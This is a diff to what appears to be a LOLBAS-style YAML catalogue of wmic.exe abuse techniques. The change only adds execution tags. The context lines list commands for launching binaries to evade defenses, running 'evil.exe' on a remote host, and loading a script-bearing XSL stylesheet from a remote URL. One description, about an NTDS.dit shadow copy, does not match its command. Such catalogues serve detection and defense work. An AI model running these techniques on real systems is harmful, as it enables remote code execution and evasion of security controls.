@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: EXE
   - Command: wmic.exe process call create calc
     Description: Execute calc from wmic
     Usecase: Execute binary from wmic to evade defensive counter measures
@@ -18,6 +20,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: EXE
   - Command: wmic.exe /node:"192.168.0.1" process call create "evil.exe"
     Description: Execute evil.exe on the remote system.
     Usecase: Execute binary on a remote system
@@ -25,6 +29,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: EXE
+      - Execute: Remote
   - Command: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
     Description: Create a volume shadow copy of NTDS.dit that can be copied.
     Usecase: Execute binary on remote system
@@ -32,6 +39,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: XSL
+      - Execute: Remote
   - Command: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
     Description: Executes JScript or VBScript embedded in the target remote XSL stylsheet.
     Usecase: Execute script from remote system
@@ -40,7 +50,8 @@ Commands:
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: WSH
+      - Execute: XSL
+      - Execute: Remote
   - Command: wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
     Description: Copy file from source to destination.
     Usecase: Copy file.
